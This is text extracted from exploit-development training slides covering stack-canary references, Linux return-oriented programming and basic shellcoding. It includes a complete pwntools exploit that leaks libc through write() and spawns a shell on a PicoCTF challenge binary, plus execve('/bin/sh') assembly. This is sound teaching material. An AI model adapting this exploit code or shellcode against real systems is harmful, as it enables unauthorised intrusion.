https://www.kapravelos.com/teaching/csc591-f17/lectures/03-canaries.pdf
https://0x00sec.org/t/exploit-mitigation-techniques-stack-canaries/5085
https://ocw.cs.pub.ro/courses/cns/labs/lab-08
|  p.190
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
References
GOT and PLT for pwning
https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html
|  p.191
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the labs drop-down in the appropriate module line or to the virtual labs 
tabs on the left navigation. To upgrade, click LINK. 
Linux NX Bypass (ret2libc)
In this lab, you will practice identifying and exploiting a stack overflow 
vulnerability on a Linux system with NX enabled. To bypass the NX 
mechanism, you will use the ret2libc technique.
|  p.192
© Caendra Inc. 2019
All Rights Reserved
Linux Return Oriented 
Programming
S e c t i o n  0 1  |  M o d u l e  0 3
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Table of Contents
MODULE 03 | RETURN ORIENTED PROGRAMMING
3.1 ROP Theory
3.2 ROP Theoretical Example
3.3 ROP Exploitation Example
|   p.2
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Learning Objectives
By the end of this module, you should have a better 
understanding of:
What Return Oriented Programming is
How the concept of Return Oriented Programming can 
be used to bypass anti-exploit mechanisms on Linux
|   p.3
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
3.1
ROP Theory
|  p.4
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
In the previous module, you learned what the most 
common exploit countermeasures are and how to beat 
them separately. 
However, when those countermeasures are combined and 
used at the same time in one binary, the situation gets 
much more complicated!
3.1 ROP Theory
|  p.5
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
When there is only ASLR, you could bruteforce the 
shellcode address. When there is only NX, you could return 
to libc, as it is always at the same address.
BUT…when there is ASLR + NX you can not bruteforce as 
the shellcode will not run on the stack. Neither can you 
return to the system, as it will always be at a different 
address. Game over?
3.1 ROP Theory
|  p.6
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Definitely not. But it will not be easy either. In order to beat 
those countermeasures used together, we will abuse code 
that is:
• Already within the process address space
• Not randomized (remember that ASLR randomizes 
certain sections, not everything)
Before we begin, let’s first introduce the concept of Return 
Oriented Programming.
3.1 ROP Theory
|  p.7
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Return-Oriented Programming can be understood as a more 
complex ret2 attack technique. In return-oriented 
programming, you can chain multiple functions to form a 
ROP chain.
In ret2system, we were calling a system function with a 
specially crafted stack layout, where the return address was 
the address of exit() so the program can return gracefully.
3.1 ROP Theory
|  p.8
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
But, of course, there could be another function instead of 
exit(). The only thing that should be done is that the stack 
should be prepared for another function.
First, let’s remind ourselves how the “return” instruction 
works. When the processor encounters the “ret” instruction, 
it transfers the program control to the address located on 
the top of the stack. 
3.1 ROP Theory
|  p.9
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Alternatively, RET can be translated to:
•
mov EIP, [ESP] //Data contained on top of the stack now 
becomes a new Instruction Pointer.
•
add esp, 4 //Then, the top position from the stack is removed 
since it is no longer used.
The „RET” instruction can also be translated to:
•
POP EIP //Such an instruction is illegal; however, for better 
understanding this is essentially what the ret instruction does.
3.1 ROP Theory
|  p.10
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
This means that the stack pointer is increased by 4 (one 
position is taken off it) and the data stored there is moved 
to the EIP. 
RET can also make use of arguments in order to perform a 
near/far return.
3.1 ROP Theory
|  p.11
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
For example, RET 4 can be translated to:
3.1 ROP Theory
|  p.12
• mov EIP, [ESP]
• add esp, 4 //those two are the standard RET 
implementation
• add esp, 4 //this is the 4 (of RET 4) – align the stack by 4 
bytes. If it's ret 8, then the following will be added: esp, 8
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
In ret2system, system() was executed, which spawned a 
bash shell, and until the bash was exited, you could operate 
on the newly spawned shell. 
If you exit bash, the application will go back to the return 
address. If the return address was the one of exit(), that 
function was executed, and if the return address was a junk 
one, the application crashed.
3.1 ROP Theory
|  p.13
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
This occurs because after finishing the function, the 
program encountered the return instruction which, 
according to the behavior just described, moved the return 
address to EIP and caused a crash since the return address 
was not valid. 
If the address was valid, the program would continue 
execution at this address, executing subsequent 
instructions. 
3.1 ROP Theory
|  p.14
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
If there was another function instead of exit(), it could be 
executed as well, only if we were able to set up the stack 
again.
3.1 ROP Theory
|  p.15
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
3.2
ROP Theoretical 
Example
|  p.16
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Let’s start with a theoretical example. 
Assume that you have controlled the EIP via a stack 
overflow vulnerability and you are carrying a ret2system 
attack. After system („/bin/bash”) is executed, bash exits, 
and you want to call another function, func2(), with a
different argument. How would you setup the stack for it?
3.2 ROP Theoretical Example
|  p.17
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
If we try to execute a ret2system attack with return to a 
non-existing func2() as the return address, what we see 
below is the program state when system() is called. Down 
the buffer, we place the argument to func2().
3.2 ROP Theoretical Example
|  p.18
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
When system() exits, the program state is similar to the 
following:
3.2 ROP Theoretical Example
|  p.19
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
What we would like to achieve is the ability to run func2() 
with an argument (arg to func 2). In this case, func2() is 
going to be run with a pointer to „/bin/sh” as an argument 
and will return to AAAA (0x41414141).
3.2 ROP Theoretical Example
|  p.20
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
This is because in a regular software the functions or the 
program (depending on the calling convention used) takes 
care of cleaning up the stack after function calls. 
As we are writing the code dynamically, we need to take 
care of this ourselves. Otherwise, the arguments to the 
previous function are left behind on the stack and will 
corrupt all functions called in the future.
3.2 ROP Theoretical Example
|  p.21
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Our current stack layout is incorrect for the purpose we 
want to achieve. 
First, we need to execute an instruction between 
system(/bin/bash) and func2(arg to func 2) that will 
decrease the stack pointer by 4 and remove the address of 
/bin/bash from the stack.
3.2 ROP Theoretical Example
|  p.22
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
So, the stack layout, for the time being, should look like this:
3.2 ROP Theoretical Example
|  p.23
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
If we execute an instruction of format POP X, RET right 
after the system() is called, then:
• POP X will cause the no-longer-user argument 
*(„/bin/sh”) to be taken off the stack and stored in a 
register. The register doesn’t matter to us as we don’t 
use it.
• RET will move the execution flow to the next address
stored on the stack.
3.2 ROP Theoretical Example
|  p.24
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
As we remove the /bin/sh, the next position of the stack is
the address of func2(). Thus, /bin/is is moved to a register 
and the execution flow returns to func2(). Due to the return 
instruction, the func2() address is also taken off the stack 
and placed in EIP.
3.2 ROP Theoretical Example
|  p.25
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
As we now reach func2(), it has the proper stack layout that 
contains both the return address from func2(), and the 
argument to func2().
3.2 ROP Theoretical Example
|  p.26
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
In order to find a POP X, RET style instruction, you might 
want to use objdump on the target binary, or use one of 
many automated tools that extract usable gadgets from 
binaries.
Let’s see how the binaries can be inspected for usable 
gadgets.
3.2 ROP Theoretical Example
|  p.27
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Let’s disassemble the default ping binary or any other 
binary of choice and look for the return instructions 
together with a few instructions before:
3.2 ROP Theoretical Example
|  p.28
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Below you can see a sample of the output of that 
command.
3.2 ROP Theoretical Example
|  p.29
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Such chains can help us adjust the stack according to our 
needs. In the theoretical example, just one instruction
needed to be cleaned from the stack, but we can also find
longer chains in binaries.
We need to take into account, that we can freely return to 
any non-randomized address even when ASLR is on. This 
way, we will soon be able to bypass ASLR. But first, let’s go 
through some more basics of this process.
3.2 ROP Theoretical Example
|  p.30
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
There will be parts that look exactly like the aforementioned 
example, like some pop X instructions followed by ret at the 
end. 
Those parts of the code that end with a return are called 
gadgets.
3.2 ROP Theoretical Example
|  p.31
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
https://1.bp.blogspot.com/-
lXyLSfw4oK4/Vz3STouf9uI/AAAAAAAABRw/B28Yfrf7fVYZMEclbBFLTMpNz
ZZcQHjMQCLcB/s1600/mood%2Band%2Bemotions%2Bword%2Bsearch.png
Gadgets can be chained 
together in order to 
execute some instructions.
You can treat a 
disassembled program like 
a crossword puzzle.
|  p.32
3.2 ROP Theoretical Example
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
In the previous slide, we saw a crossword puzzle. Apart 
from the words that are already provided, different words 
can be created from it. It’s similar with a binary.
3.2 ROP Theoretical Example
|  p.33
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
However, it’s actually a bit more complicated. We are 
interested in anything that might help us continue execution 
– like instructions that end with ret, but also:
• A chain of instructions that end with a far/near return –
e.g., ret 8.
• A chain of instructions that end with a jump to a 
previously controlled value, like pop eax and call eax.
3.2 ROP Theoretical Example
|  p.34
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Apart from those conditions, the fragments we are about to 
use should not be from randomized areas, since we are 
aiming to beat ASLR. 
The last question that we are going to answer is what 
exactly should be built using gadgets in order to turn an 
EIP-controlling crash into code execution?
3.2 ROP Theoretical Example
|  p.35
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Like in the crossword example, things that can be built from 
a disassembled binary are limited only by the creativity of 
the exploit developer. However, there are two main ideas 
that the exploit can utilize:
• Try to execute a shellcode-like ROP chain. That is, find 
code fragments that will place certain values in proper 
registers (e.g., via pop instructions) and then execute a 
syscall. This is the hard way to exploit a binary.
3.2 ROP Theoretical Example
|  p.36
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
• Try to execute a function that will help us leak an 
address that can be referenced relatively. For example, 
if there is an address that is always relative to the libc 
base by the same offset at each execution, knowing this 
address will allow us to dynamically calculate the system 
address and jump to it in the ROP chain. Functions like 
write() might be helpful in that case.
3.2 ROP Theoretical Example
|  p.37
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Another technique we might rely on is to trigger an arbitrary 
write, e.g. using the read() function. 
3.2 ROP Theoretical Example
|  p.38
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Before we jump into actual exploitation, let’s first see how 
we can optimize gadget searching, since looking for 
opcodes manually would be a terribly tedious task.
3.2 ROP Theoretical Example
|  p.39
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
There are plenty of ROP-related tools available on the web. 
Their usage is simple – use them against a binary of choice 
and get a list of possible ROP gadgets together with their 
addresses. 
It is worth running all ROP-generating tools on one binary to 
get all the possible output. One tool might find something
that another tool missed.
3.2 ROP Theoretical Example
|  p.40
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Here are some examples of tools that you might want to 
use:
• https://github.com/sashs/Ropper
• https://github.com/JonathanSalwan/ROPgadget
3.2 ROP Theoretical Example
|  p.41
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Searching for single ROP gadgets is the last resort in an 
exploitation process. 
Most of the time, we would like to return to another 
function, and if needed, we can try to use single gadgets to 
align the stack.  
3.2 ROP Theoretical Example
|  p.42
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
You’ve been studying quite 
intently. We recommend taking 
a quick break and come back 
refreshed. 
|  p.43
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
3.3
ROP Exploitation 
Example
|  p.44
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-3
Let’s analyze a simple ROP-style exploitation based on the 
ROP-3 challenge of Pico CTF 2013. The vulnerable binary 
can be downloaded from the challenge’s github page. 
The page contains a short writeup on the challenge;
however, we will analyze it in depth to show you the 
exemplary exploitation process.
3.3 ROP Exploitation Example
|  p.45
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
First, we need to download the binary and rename it to rop3, 
as the original name is not user friendly. 
3.3 ROP Exploitation Example
|  p.46
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Let’s also run checksec on the file, to see what 
countermeasures we will have to beat on our way to 
developing a working exploit.
3.3 ROP Exploitation Example
|  p.47
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
The source code is also
presented on the
binary’s github page. 
We will make use of it, 
as it will save us from
efforts related to 
examining the binary.
3.3 ROP Exploitation Example
|  p.48
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
What we know so far is that there is an obvious overflow in 
the vulnerable() function. The be_nice_to_people() function 
will not help us this time.
3.3 ROP Exploitation Example
|  p.49
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Let’s run the program within gdb to discover the offset to 
EIP.
3.3 ROP Exploitation Example
|  p.50
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Below we confirm the offset (notice the “B”s).
3.3 ROP Exploitation Example
|  p.51
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
We control the EIP. What now? 
We have ASLR and NX, but maybe we can return to some 
function. Let’s inspect the binary to see what interesting 
functions we can call. Note that we cannot just call 
something from libc, like system, as ASLR is in place, but 
we can use functions that are present in PLT, as their 
addresses will not be randomized.
3.3 ROP Exploitation Example
|  p.52
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
By entering gdb and running „info functions” we get a list of
the functions present in PLT.
3.3 ROP Exploitation Example
|  p.53
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
We have two useful functions: 
• read()
• write()
We will utilize them to leak data from the binary.
3.3 ROP Exploitation Example
|  p.54
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Contrary to these functions’ names, we can write data to an 
arbitrary location using read() and read arbitrary data 
using write(). Yes, this sounds confusing.
3.3 ROP Exploitation Example
|  p.55
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Let’s now use this information to perform a return-to-write 
attack. We will use write() to read the current address of 
read() from LIBC. 
We’ll run the program in gdb, and then when the prompt for 
user data appears, we’ll press Ctrl+C.
3.3 ROP Exploitation Example
|  p.56
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Then, we’ll examine the address pointed by READ. We can 
see that it is within libc.
3.3 ROP Exploitation Example
|  p.57
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
As we know that in libc all addresses are at a constant offset from the 
libc base, we can also infer that all addresses are at a constant offset 
from each other. Thus, if we now check the address of system(), we can 
count the offset from read() to system().
read@got contains read’s libc address 0xb7e53b00
checking libc directly (p command) shows that system() is at
0xb7db8da0
3.3 ROP Exploitation Example
|  p.58
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
As libc is randomized, those addresses will differ in each 
run. 
But using write(), we can leak the current address from the 
GOT address of read() as we did with the „x”  (examine) 
command within the gdb.
3.3 ROP Exploitation Example
|  p.59
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
We need to set up the stack as in a regular ret2libc attack: 
place the return address, the arguments and then call the 
function.
• int fd (file descriptor) is 1, as stdout is always fd 1 – this 
is a Linux default value.
• *buf, from what we read, will be the read() function 
address in the GOT.
• size will be 4, as we need just the 4-byte address.
3.3 ROP Exploitation Example
|  p.60
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
As the vulnerable function is read(), we do not need to worry 
about null bytes. Read() does not stop on them.
•
0x080483a0 will be the EIP (write() address).
•
The return address; let’s set it to „CCCC” for the time being so 
that the program will segfault at the end.
•
Next is the fd argument: 0x00000001.
•
Then we have the read() address: 0x0804a000. We use 
read()’s GOT entry as it is not randomized and points directly 
to libc. The PLT stub just points to the GOT entry, so it is not 
usable here.
•
And the size is equal to 0x00000004.
3.3 ROP Exploitation Example
|  p.61
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
After running the command below, we get a return address 
that is similar to the libc addresses. We know that, as we 
recently calculated some libc addresses and we know that 
0xb7e***** is in the libc address space.
3.3 ROP Exploitation Example
|  p.62
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
As with the stack canary example, we will need to use 
pwntools or a similar framework to process the returned 
bytes conveniently.
3.3 ROP Exploitation Example
|  p.63
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Let’s implement this logic into an exploit skeleton. Again, we will 
use pwntools. The input we issued to the application is now 
stored in one variable named leak. Then the binary is started, the 
input is sent, and the 4 bytes returned by the write() function are 
saved in a variable named read_addr.
3.3 ROP Exploitation Example
|  p.64
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
We ignore the warning message regarding the system 
architecture. The exploit is working as expected and 
subsequent runs end with a different address being 
displayed. That’s due to ASLR.
3.3 ROP Exploitation Example
|  p.65
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
If you run the program in gdb, you will see that it segfaults 
due to the return to „0x43434343”, which is reasonable.
As we already have the address of libc (as we have an 
address of a function in libc), how can we abuse that fact?
3.3 ROP Exploitation Example
|  p.66
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
The stack so far contains arguments for write, as they were 
not removed. In order to call another function, we need to 
gather ROP gadgets that will clean the stack and set other 
values there so that another function, like read(), can be 
called. Or don’t we?
3.3 ROP Exploitation Example
|  p.67
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Fortunately there is an easier way. We can simply return to 
the vulnerable_function instead of „CCCC”(0x43434343). 
The vulnerable_function does not take any arguments so it 
does not really care about stack arguments and will 
perform the vulnerable read operation a second time, giving 
us another chance to exploit the vulnerability, but this time, 
we know the addresses of the items in libc(). 
3.3 ROP Exploitation Example
|  p.68
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Let’s simply add the address of the vulnerable_function to 
the exploit:
3.3 ROP Exploitation Example
|  p.69
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
In its current shape, the exploit will print the leaked address 
twice as a proof that it was possible to perform two 
vulnerable operations (as vulnerable_function was called 
again).
3.3 ROP Exploitation Example
|  p.70
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
As we confirmed that the overflow operation can be 
performed a second time, let’s try to implement the second 
payload that will perform a ret2system-style attack. 
In order to do so, we need to write down the addresses of 
the system and the string „/bin/sh” together with their 
offsets to the read() address.
3.3 ROP Exploitation Example
|  p.71
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Using gdb, we run the binary, then press Ctrl+C and issue several 
commands in order to calculate the distances (offsets) between 
items in libc. Please note that if you follow the exercise on a 
different OS version, these offsets might be different.
3.3 ROP Exploitation Example
|  p.72
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
The offsets are placed in the respective variables that will 
help to calculate the prerequisities to call system().
3.3 ROP Exploitation Example
|  p.73
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
As the ret2system attack is known to you already, you 
should see that it is basically it, we just use dynamically 
calculated addresses instead of hardcoded ones.
We simply call system() with the address of the „/bin/sh” 
string as an argument, and after all of that we return to 
exit().
3.3 ROP Exploitation Example
|  p.74
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
As you can see, the exploit works as expected:
3.3 ROP Exploitation Example
|  p.75
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
Here is the full exploit code we used:
from pwn import *
context(arch="i686", os="linux")
leak = "A"*140 + "\xa0\x83\x04\x08" + "\x74\x84\x04\x08" + "\x01\x00\x00\x00" + "\x00\xa0\x04\x08" + "\x04\x00\x00\x00"
exploit = process("./rop3", shell=True)
exploit.sendline(leak)
read_addr = unpack(exploit.recv(4))
print "[+] read is at: " + hex(read_addr)
system_addr = read_addr - 0x9ad60
binsh_addr = read_addr + 0x85f0b
exit_addr = read_addr - 0xa7130
print "[+] system is at: " + hex(system_addr)
print "[+] /bin/sh is at: " + hex(binsh_addr)
shell = "A"*140 + pack(system_addr) + pack(exit_addr) + pack(binsh_addr)
exploit.sendline(shell)
exploit.interactive()
|  p.76
3.3 ROP Exploitation Example
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
This was an example on how ROP works. We used pieces 
of code available in the program in order to combine them 
into a staged exploit. 
Luckily, we did not have to search and push single gadgets 
into the stack, as we could simply return to the vulnerable 
function.
3.3 ROP Exploitation Example
|  p.77
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
You will be able to practice and learn more about ROP-
assisted exploitation within the labs of a later module.
For the time being, you can check out the following helpful 
resources:
https://devel0pment.de/?p=366
https://reboare.github.io/bof/linux-stack-bof-3.html
3.3 ROP Exploitation Example
|  p.78
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
References
|  p.79
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
References
Ropper
ROPgadget
PicoCTF 2013: ROP 2
write-ups-2013/pico-ctf-2013
https://github.com/sashs/Ropper
https://github.com/JonathanSalwan/ROPgadget
https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-2
https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013
|  p.80
XDSv1: Section 1, Module 3 - Caendra Inc. © 2019
References
RPISEC/MBE: writeup lab05 (DEP and ROP)
Stack Buffer Overflows: Linux 3 - Bypassing DEP with ROP
https://devel0pment.de/?p=366
https://reboare.github.io/bof/linux-stack-bof-3.html
|  p.81
© Caendra Inc. 2019
All Rights Reserved
Linux Shellcoding
S e c t i o n  0 1  |  M o d u l e  0 4
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Table of Contents
MODULE 04 | LINUX SHELLCODING
4.1 x86 Assembly Basics
4.2 Basic Linux Shellcode
4.3 Reverse TCP Shellcode
4.4 x64 Architecture
4.5 Writing x64 Shellcode
|   p.2
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Learning Objectives
By the end of this module, you should have a better 
understanding of:
Programming in Linux assembly and using it to create 
shellcode
Shellcoding in x86 and x64 architectures
|   p.3
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
4.1
x86 Assembly 
Basics
|  p.4
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The Assembly language allows us to communicate directly 
with the machine’s processor.
Due to it being a low-level programming language, it is used 
only for specific purposes, like writing device drivers. If you 
want to create a GUI program, Assembly is certainly not the 
language to use.
|  p.5
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The Assembly language consists of instructions that 
directly tell the processor what to do with its components –
like move a value to register, or move data from the register 
to the program’s stack.
With high level languages you can define some variables, 
and upon compilation or interpretation, the language engine 
or compiler takes care of the deep internals. In Assembly,
you need to take care of literally everything. Let’s briefly 
take a look at Assembly internals.
|  p.6
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
There are some common segments within a program that 
is loaded into memory:
• The stack segment that is for function calls. 
• The heap segment that is for dynamically allocated 
memory.
• The data segment that is for variables.
• The bss segment that is also for variables.
• The text segment where the actual code resides.
|  p.7
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
On 32-bit Linux, there are 32-bit (4 bytes) wide registers.
The general purpose registers are:
• EAX, EBX, ECX, EDX, ESI and EDI, which can hold your 
data.
• EBP, which is the stack base, and ESP, which is the top of 
the stack.
|  p.8
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
There are also segment registers, which are rarely used.
Their purpose was to extend the possible addressing range 
by pointing to some segments of memory, which can be 
then accessed via an address of format:
Segment Register:General Purpose Register
In modern systems, this mechanism is not used.
|  p.9
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Segment registers are SS (Stack segment), CS (Code 
segment), DS (Data segment), and ES (Extra segment).
There are also two more – G Segment (GS) and F Segment 
(FS), which contrary to the previous Segment registers, are 
used to hold thread specific data. 
|  p.10
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Of course there is also the EIP, the instruction pointer, which 
holds the address of the instruction to be executed. Note that the 
computer does not distinguish instruction from data. Wherever
the EIP points to, this is what will be executed.
There is also the EFLAGS register, which is used to store boolean 
information (byte is 1 or 0) of various assembly operations. 
EFLAGS are divided into multiple one-byte segments, and each of 
them is set to 0 or 1 after certain assembly instructions return 
true or false.
|  p.11
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We will mostly make use of the General Purpose Registers 
for our Assembly operations. 
Each of these registers is 4-bytes wide; however, each can 
be divided into smaller chunks that are also addressable 
from within the Assembly programs.
|  p.12
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
For example, if you want 
to target the least 
significant byte of the 
EAX register, you need to 
address the AL register.
https://www.cavestory.org/guides/csasm/guide/img/redefined_registers.png
|  p.13
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Basic Assembly instructions we will use are:
• MOV – move data.
• ADD – add a value to register.
• POP REG – move value from the top of the stack to a 
register (stack pointer will be increased by 4, as the stack 
grows towards lower addresses).
• PUSH REG – copy value from a register and put it on the 
top of the stack (stack pointer will be then decreased by 
4).
|  p.14
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
• Conditional instructions JE (Jump if Equal), JLE (Jump if 
Less or Equal), JNZ (Jump if Not Zero), and more are 
executed based on certain values of the EFLAGS register.
• Comparison instructions TEST, CMP – depending on 
their result, change certain parts of the EFLAGS to 1.
|  p.15
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The following conditional instructions rely on EFLAGS 
values.
https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm
|  p.16
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
For example, the TEST instruction will set the ZF (Zero Flag, 
part of EFLAGS) if both tested operands are equal to zero.
You can read more about the flag modifiers here. You don’t 
need to learn those by heart; however, when analyzing  
Assembly code you might want to go back to such 
references, especially when investigating conditional 
instructions.
http://www.godevtool.com/GoasmHelp/usflags.htm
|  p.17
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The last instruction worth mentioning is the SYSCALL instruction. 
Linux has a set of functions that are contained within the 
operating system and do not require any library to be called. As 
Linux is written in C, they are basically C functions. 
Syscalls can take arguments as regular functions do; however, in 
order to invoke a syscall, certain values (arguments) have to be 
stored in registers. As soon as they are set, an int 0x80 
instruction has to be called. A handy reference of linux syscalls 
can be found here.
https://syscalls.kernelgrok.com
|  p.18
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We will explain more about Assembly instructions as we will use 
them throughout the module. What is important from an exploit 
development standpoint, is that assembly instructions can be 
translated directly to opcodes, which are certain bytes that are 
understood by the processor.
Shellcode consists of opcodes. For example, each metasploit 
payload in an executable format contains lots of opcodes, which 
in the end cause the process to execute certain actions (e.g.,
spawn a shell or make a remote connection).
|  p.19
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We will use Assembly to create our shellcode of choice. 
Before we develop shellcode, make sure you have nasm 
and objdump on your system. If not, install them using:
sudo apt-get install binutils nasm
|  p.20
4.1 x86 Assembly Basics
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
4.2
Basic Linux 
Shellcode
|  p.21
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Let’s try to write some basic shellcode that spawns 
„/bin/bash”. In order to do so, we will utilize syscall #11 
(0xb) which is execve. 
This C function simply starts the program name that is
passed as its argument.
|  p.22
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
In order to execute a syscall, we will need the following 
register set up:
• EAX will hold the syscall number (0x0b).
• EBX will hold the name of program to execute.
• ECX can be null.
• Afterwards, we will call int 0x80.
|  p.23
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Following the Assembly 
code on your right will
allow you to accomplish 
that aforementioned task.
section .data
shell db '/bin/sh’ ; db = define byte. We basically 
declare a string variable
section .text
global _start   ; Syntax requires that decalration. It is 
comparable to int main()
_start:
mov eax, 11     ; We store the syscall number in eax
mov ebx, shell   ; Address of the shell variable (string 
/bin/sh) is stored in ebx
mov ecx, 0      ; ECX can be null
int 0x80        ; Interrupt instruction – we issue the 
syscall
mov eax, 1      ; Next syscall – 1 is number of exit()
mov ebx, 0      ; Exit code – return 0
int 0x80        ; Issue the syscall with Interrupt 0x80
|  p.24
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We can compile this program using nasm, which will
provide us with an output of an object file. 
The object files contain object code that is not directly 
executable. We need to run a linker on it so that it outputs 
the executable file as a result. When compiling (e.g. using 
gcc), those two tasks are run within the compilation 
process.
|  p.25
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The object files contain object code, that is – the primary 
compiler output. The linker can link (stick together) several 
object files (e.g. the executable and a library it includes) and 
output an executable file out of them. In this case, we have just 
one file, but regardless of this we need to run two tools in order 
to produce an executable. You can find more on linkers here.
So as we are compiling Assembly to an executable format, let’s 
use nasm and ld to produce the executable out of that code.
https://www.learncpp.com/cpp-tutorial/introduction-to-the-compiler-linker-and-libraries/
|  p.26
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The source file is named sc1.asm.
nasm –f elf –o sc1.o sc1.asm
ld –o sc1 sc1.o
|  p.27
